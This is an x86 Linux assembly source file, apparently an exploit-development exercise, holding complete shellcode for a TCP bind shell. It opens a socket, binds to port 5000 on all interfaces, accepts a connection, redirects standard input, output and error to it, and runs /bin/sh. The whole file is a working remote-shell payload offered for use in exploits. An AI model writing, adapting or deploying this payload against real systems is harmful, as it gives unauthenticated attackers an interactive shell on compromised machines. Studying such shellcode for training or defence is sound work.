; Filename: shellcode.nasm
; Author: lastlistener
; Purpose: Shellcode that creates a TCP bind shell on a machine. 

global _start			

section .text
_start:
	xor esi,esi					; ESI basically used as 0 constant throughout
	; eax = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
	push esi					; IPPROTO_TCP
	push byte 1					; SOCK_STREAM
	push byte 2					; AF_INET
	mov ecx,esp					; address of params
	mov al,102					; syscall number
	mov bl,1					; socketcall number
	int 0x80					; socket()
	mov edx,eax					; save return value
	
	; bind(socket, INADDR_ANY *sockaddr, sizeof(sockaddr))
	; e.g. https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html
	push esi					; sockaddr->family = INADDR_ANY
	push word 0x8813				; sockaddr->port = htons(5000)
	push word 2					; sockaddr->family = AF_INET
	mov ecx,esp					; ecx = &sockaddr

	push 16						; sizeof(sockaddr)
	push ecx					; &sockaddr
	push edx					; socket
	mov ecx,esp					; address of arguments
	mov al,102					; syscall number
	mov bl,2					; socketcall number
	int 0x80					; bind()

	; listen(socket, backlog 0)
	push esi
	push edx
	mov ecx,esp
	mov al,102
	mov bl,4
	int 0x80

	; eax = accept(socket, NULL *address, NULL address_length)
	push esi
	push esi
	push edx
	mov ecx,esp
	mov al,102
	mov bl,5
	int 0x80
	mov edx,eax

	; dup2(socket, stdin)
	mov al,63
	mov ebx,edx
	mov ecx,esi
	int 0x80

	; dup2(socket,stdout)
	mov al,63
	mov ebx,edx
	mov cl,1
	int 0x80

	; dup2(socket,stderr)
	mov al,63
	mov ebx,edx
	mov cl,2
	int 0x80

	; execve(filename, argv, env)
	push esi
	push dword 0x68732f2f			;
	push dword 0x6e69622f
	mov ebx,esp
	mov al,11
	mov ecx,esi
	mov edx,esi
	int 0x80
